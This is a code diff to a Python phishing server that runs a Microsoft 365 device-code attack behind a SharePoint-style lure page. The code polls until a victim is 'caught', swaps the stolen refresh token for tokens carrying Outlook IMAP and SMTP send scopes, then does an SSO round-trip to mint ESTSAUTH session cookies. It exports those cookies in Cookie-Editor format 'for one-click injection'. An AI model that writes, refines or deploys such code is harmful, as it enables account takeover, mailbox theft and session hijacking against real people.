@@ -21,7 +21,8 @@ CLIENT_IDS = [
 ]
 CLIENT_ID_INDEX = 0
 
-DEVICE_CODE_SCOPE = "offline_access https://graph.microsoft.com/Mail.Read https://outlook.office.com/IMAP.AccessAsUser.All"
+# IMPORTANT: Outlook resource ONLY. No graph.microsoft.com — mixing resources causes AADSTS65002.
+DEVICE_CODE_SCOPE = "offline_access https://outlook.office.com/IMAP.AccessAsUser.All https://outlook.office.com/SMTP.Send"
 
 COOKIE_WANTED = [
     "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "ESTSAUTHTCT",
@@ -48,7 +49,6 @@ def init_db():
         cookies TEXT,
         ts TEXT
     )""")
-    # upgrade older DBs that lack the cookies column
     cols = [r[1] for r in con.execute("PRAGMA table_info(sessions)").fetchall()]
     if "cookies" not in cols:
         con.execute("ALTER TABLE sessions ADD COLUMN cookies TEXT")
@@ -148,14 +148,13 @@ def decode_id_token(id_token):
 
 # ---------- Cookie minting ----------
 def get_victim_cookies(refresh_token, client_id, email):
-    """Exchange the refresh token, then hit /authorize so MS sets ESTSAUTH
-    cookies on our server-side session. Returns dict of cookie name->value."""
+    """Exchange refresh token, then hit /authorize so MS sets ESTSAUTH cookies."""
     try:
         s = requests.Session()
         s.headers.update({
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
         })
-        # Step 1: refresh token -> new tokens (same client_id that issued it)
+        # Step 1: refresh token -> new tokens (same client_id, same Outlook scope)
         r = s.post(
             f"{UPSTREAM}/common/oauth2/v2.0/token",
             data={
@@ -171,8 +170,7 @@ def get_victim_cookies(refresh_token, client_id, email):
             print("[COOKIES] refresh failed:", data.get("error"), data.get("error_description", "")[:200])
             return None
 
-        # Step 2: SSO authorize round-trip so login.microsoftonline.com
-        # issues ESTSAUTH / ESTSAUTHPERSISTENT etc. onto this session
+        # Step 2: SSO authorize round-trip so login.microsoftonline.com issues cookies
         nonce = uuid.uuid4().hex
         auth_url = (
             f"{UPSTREAM}/common/oauth2/authorize?"
@@ -203,7 +201,6 @@ def format_cookies_text(cookies, email):
     return "\n".join(lines)
 
 def format_cookie_editor_json(cookies):
-    """Cookie-Editor import format for one-click injection."""
     out = []
     for name, value in cookies.items():
         out.append({
@@ -249,7 +246,6 @@ def poll_worker():
                         "refresh_token": data.get("refresh_token"),
                         "id_token": data.get("id_token"),
                     }
-                    # Mint victim cookies from the refresh token
                     cookies = get_victim_cookies(tokens["refresh_token"], client_id, email)
                     if cookies:
                         db_update_session(sid, status="caught", email=email,
@@ -299,7 +295,6 @@ def poll_worker():
         shutdown_event.wait(timeout=3)
     print("[WORKER] poll_worker stopped")
 
-# Start worker exactly once, safe under Gunicorn import
 _worker_started = False
 def start_worker():
     global _worker_started
@@ -316,7 +311,7 @@ def _shutdown(sig, frame):
 signal.signal(signal.SIGTERM, _shutdown)
 signal.signal(signal.SIGINT, _shutdown)
 
-# ---------- Page (SharePoint style — your landing page, unchanged) ----------
+# ---------- Page (SharePoint style — unchanged) ----------
 def render_page(user_code, verify_url):
     return f"""<!DOCTYPE html>
 <html lang="en">
